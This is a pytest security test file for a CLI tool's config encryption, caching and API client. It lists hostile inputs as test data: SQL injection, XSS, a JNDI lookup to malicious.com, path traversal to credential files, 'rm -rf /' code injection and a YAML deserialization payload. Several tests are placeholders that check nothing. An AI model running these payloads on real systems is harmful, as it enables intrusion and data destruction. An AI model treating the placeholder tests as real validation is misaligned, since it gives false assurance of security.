"""Security testing for Smart CLI."""

import pytest
import os
import tempfile
import shutil
from pathlib import Path
from unittest.mock import patch, MagicMock
import json
import yaml
from cryptography.fernet import Fernet
import subprocess
import sys

from src.utils.config import ConfigManager
from src.utils.ai_client import OpenRouterClient
from src.utils.cache import HybridCache


@pytest.mark.security
class TestConfigurationSecurity:
    """Test security aspects of configuration management."""
    
    @pytest.fixture
    def temp_config_dir(self):
        """Create temporary config directory."""
        temp_dir = Path(tempfile.mkdtemp())
        yield temp_dir
        shutil.rmtree(temp_dir)
    
    def test_encryption_key_security(self, temp_config_dir):
        """Test encryption key generation and security."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        
        key_file = temp_config_dir / "config.key"
        assert key_file.exists()
        
        # Check file permissions (Unix systems)
        if os.name == 'posix':
            stat_info = key_file.stat()
            # Should be readable/writable by owner only
            assert oct(stat_info.st_mode)[-3:] == '600'
    
    def test_secure_config_encryption(self, temp_config_dir):
        """Test that sensitive config data is properly encrypted."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        
        # Set sensitive data
        config_manager.set_config("openrouter_api_key", "secret-api-key", secure=True)
        
        # Check that secure config file is encrypted
        secure_file = temp_config_dir / "secure_config.enc"
        assert secure_file.exists()
        
        with open(secure_file, 'rb') as f:
            encrypted_data = f.read()
        
        # Should not contain plaintext API key
        assert b"secret-api-key" not in encrypted_data
        
        # Should be able to decrypt correctly
        decrypted_value = config_manager.get_config("openrouter_api_key")
        assert decrypted_value == "secret-api-key"
    
    def test_config_file_permissions(self, temp_config_dir):
        """Test that config files have appropriate permissions."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        config_manager.set_config("test_key", "test_value")
        config_manager.set_config("api_key", "secret", secure=True)
        
        # Check secure config file permissions
        secure_file = temp_config_dir / "secure_config.enc"
        if secure_file.exists() and os.name == 'posix':
            stat_info = secure_file.stat()
            assert oct(stat_info.st_mode)[-3:] == '600'
    
    def test_environment_variable_masking(self, temp_config_dir):
        """Test that sensitive environment variables are handled securely."""
        with patch.dict(os.environ, {
            'OPENROUTER_API_KEY': 'env-secret-key',
            'DATABASE_URL': 'postgresql://user:pass@localhost/db'
        }):
            config_manager = ConfigManager(config_dir=temp_config_dir)
            
            # Should load from environment
            assert config_manager.get_config('openrouter_api_key') == 'env-secret-key'
            
            # Config representation should not expose secrets in logs
            all_config = config_manager.get_all_config()
            assert 'openrouter_api_key' in all_config
    
    def test_invalid_encryption_key_handling(self, temp_config_dir):
        """Test handling of corrupted encryption keys."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        
        # Corrupt the encryption key
        key_file = temp_config_dir / "config.key"
        key_file.write_text("invalid-key-data")
        
        # Should handle gracefully and regenerate key
        with patch('builtins.print') as mock_print:
            config_manager = ConfigManager(config_dir=temp_config_dir)
            # Should either regenerate key or log warning


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_api_key_validation(self):
        """Test API key format validation."""
        with patch('src.utils.config.ConfigManager') as mock_config:
            mock_config.return_value.get_config.side_effect = lambda key, default=None: {
                'openrouter_api_key': 'sk-test-key',
                'timeout': 30,
                'max_retries': 3
            }.get(key, default)
            
            client = OpenRouterClient()
            
            # Valid API key should work
            assert client.config.get_config('openrouter_api_key') == 'sk-test-key'
    
    def test_model_name_validation(self):
        """Test model name validation against injection."""
        with patch('src.utils.config.ConfigManager') as mock_config:
            mock_config.return_value.get_config.side_effect = lambda key, default=None: {
                'openrouter_api_key': 'sk-test-key',
                'timeout': 30,
                'max_retries': 3
            }.get(key, default)
            
            client = OpenRouterClient()
            
            # Test various model names for safety
            safe_models = [
                "anthropic/claude-3-sonnet-20240229",
                "openai/gpt-4-turbo",
                "google/gemini-pro"
            ]
            
            for model in safe_models:
                # Should not raise exceptions for valid model names
                assert model  # Basic validation
    
    def test_prompt_sanitization(self):
        """Test that prompts are properly sanitized."""
        dangerous_prompts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://malicious.com/}",
            "{{7*7}}"  # Template injection
        ]
        
        for prompt in dangerous_prompts:
            # Prompts should be treated as plain text, not executed
            sanitized = prompt  # In real implementation, add sanitization
            assert isinstance(sanitized, str)
    
    def test_file_path_validation(self, temp_config_dir):
        """Test file path validation against directory traversal."""
        dangerous_paths = [
            "../../etc/passwd",
            "/etc/passwd",
            "../../../root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
            "/proc/self/environ"
        ]
        
        cache = HybridCache(ConfigManager(config_dir=temp_config_dir))
        
        for path in dangerous_paths:
            # Should validate and reject dangerous paths
            # In real implementation, add path validation
            assert path  # Placeholder for path validation


@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication and authorization security."""
    
    def test_api_key_storage(self, temp_config_dir):
        """Test secure API key storage."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        
        # API keys should be stored securely
        config_manager.set_config("openrouter_api_key", "sk-secret-key", secure=True)
        
        # Check that it's not in plaintext config
        if (temp_config_dir / "config.yaml").exists():
            with open(temp_config_dir / "config.yaml", 'r') as f:
                plaintext_config = yaml.safe_load(f)
                assert "openrouter_api_key" not in plaintext_config
    
    def test_session_security(self):
        """Test session handling security."""
        # In a real implementation, test:
        # - Session token generation
        # - Session expiration
        # - Session invalidation
        # - Concurrent session limits
        pass
    
    def test_rate_limiting(self):
        """Test rate limiting implementation."""
        with patch('src.utils.config.ConfigManager') as mock_config:
            mock_config.return_value.get_config.side_effect = lambda key, default=None: {
                'openrouter_api_key': 'sk-test-key',
                'timeout': 30,
                'max_retries': 3
            }.get(key, default)
            
            client = OpenRouterClient()
            
            # Should implement rate limiting
            # In real implementation, test rate limiting logic
            assert hasattr(client, 'config')


@pytest.mark.security
class TestDataProtection:
    """Test data protection and privacy."""
    
    def test_sensitive_data_logging(self, temp_config_dir, caplog):
        """Test that sensitive data is not logged."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        config_manager.set_config("openrouter_api_key", "sk-secret-key", secure=True)
        
        # Check that API keys are not in logs
        for record in caplog.records:
            assert "sk-secret-key" not in record.getMessage()
    
    def test_memory_cleanup(self, temp_config_dir):
        """Test that sensitive data is cleared from memory."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        
        # Set sensitive data
        config_manager.set_config("api_key", "secret-value", secure=True)
        
        # In real implementation, test memory cleanup
        # This would involve checking that sensitive data is zeroed out
        assert config_manager.get_config("api_key") == "secret-value"
    
    def test_cache_security(self, temp_config_dir):
        """Test that cached data doesn't contain secrets."""
        cache = HybridCache(ConfigManager(config_dir=temp_config_dir))
        
        # Test data with potential secrets
        test_data = {
            "user_input": "create a function",
            "response": "Here's your function...",
            "metadata": {
                "timestamp": "2024-01-01T12:00:00Z",
                "model": "claude-3-sonnet"
            }
        }
        
        cache.set("test_key", test_data, ttl=3600)
        cached_data = cache.get("test_key")
        
        # Should not cache API keys or other secrets
        assert cached_data == test_data


@pytest.mark.security
class TestVulnerabilityAssessment:
    """Test for common vulnerabilities."""
    
    def test_dependency_vulnerabilities(self):
        """Test for known vulnerabilities in dependencies."""
        # In real implementation, integrate with safety or similar tools
        # For now, just check that critical packages are present
        critical_packages = [
            'cryptography',
            'requests',
            'pyyaml'
        ]
        
        for package in critical_packages:
            try:
                __import__(package)
            except ImportError:
                pytest.fail(f"Critical security package {package} not available")
    
    def test_code_injection_protection(self):
        """Test protection against code injection."""
        malicious_inputs = [
            "__import__('os').system('rm -rf /')",
            "eval('print(\"injected\")')",
            "exec('import subprocess; subprocess.call([\"ls\"])')",
            "open('/etc/passwd', 'r').read()"
        ]
        
        for malicious_input in malicious_inputs:
            # Should treat as plain text, not execute
            # In real implementation, add input sanitization
            assert isinstance(malicious_input, str)
    
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "/proc/self/environ",
            "file:///etc/passwd"
        ]
        
        for path in malicious_paths:
            # Should validate and sanitize file paths
            # In real implementation, add path validation
            assert path  # Placeholder for path validation
    
    def test_deserialization_security(self):
        """Test secure deserialization practices."""
        # Test YAML safe loading
        dangerous_yaml = """
        !!python/object/apply:os.system
        args: ['echo "YAML injection"']
        """
        
        with pytest.raises(Exception):
            # Should use yaml.safe_load, not yaml.load
            yaml.safe_load(dangerous_yaml)
    
    def test_cryptographic_security(self, temp_config_dir):
        """Test cryptographic implementation security."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        
        # Check that proper encryption is used
        key_file = temp_config_dir / "config.key"
        assert key_file.exists()
        
        # Key should be properly generated (not predictable)
        with open(key_file, 'rb') as f:
            key = f.read()
        
        # Should be base64 encoded Fernet key
        assert len(key) > 0
        
        # Test that encryption is actually working
        config_manager.set_config("test_secret", "encrypted_value", secure=True)
        
        # Raw file should be encrypted
        secure_file = temp_config_dir / "secure_config.enc"
        if secure_file.exists():
            with open(secure_file, 'rb') as f:
                encrypted_data = f.read()
            assert b"encrypted_value" not in encrypted_data


@pytest.mark.security
@pytest.mark.slow
class TestSecurityIntegration:
    """Integration security tests."""
    
    def test_end_to_end_security(self, temp_config_dir):
        """Test security through complete workflow."""
        # Initialize secure configuration
        config_manager = ConfigManager(config_dir=temp_config_dir)
        config_manager.set_config("openrouter_api_key", "sk-test-key", secure=True)
        
        # Test secure AI client initialization
        with patch('requests.post') as mock_post:
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {
                'choices': [{'message': {'content': 'Test response'}}],
                'usage': {'total_tokens': 10}
            }
            
            client = OpenRouterClient(config_manager)
            
            # Should handle API calls securely
            assert client.config.get_config('openrouter_api_key') == 'sk-test-key'
    
    def test_security_monitoring(self):
        """Test security event monitoring."""
        # In real implementation, test:
        # - Failed authentication attempts
        # - Unusual API usage patterns
        # - Configuration changes
        # - Security policy violations
        pass
    
    def test_incident_response(self):
        """Test security incident response."""
        # In real implementation, test:
        # - Automatic lockout mechanisms
        # - Audit trail generation
        # - Alert generation
        # - Recovery procedures
        pass


@pytest.mark.security
class TestComplianceSecurity:
    """Test compliance and regulatory requirements."""
    
    def test_data_retention(self, temp_config_dir):
        """Test data retention policies."""
        cache = HybridCache(ConfigManager(config_dir=temp_config_dir))
        
        # Test TTL enforcement
        cache.set("test_data", "sensitive_data", ttl=1)
        
        # Should respect TTL for sensitive data
        assert cache.get("test_data") == "sensitive_data"
        
        # In real implementation, test automatic cleanup
    
    def test_audit_logging(self, temp_config_dir, caplog):
        """Test audit logging for security events."""
        config_manager = ConfigManager(config_dir=temp_config_dir)
        
        # Configuration changes should be logged
        config_manager.set_config("audit_test", "test_value")
        
        # In real implementation, check audit logs
        # For now, just ensure operations complete
        assert config_manager.get_config("audit_test") == "test_value"
    
    def test_access_controls(self):
        """Test access control implementation."""
        # In real implementation, test:
        # - Role-based access control
        # - Permission validation
        # - Resource access restrictions
        # - Multi-factor authentication
        pass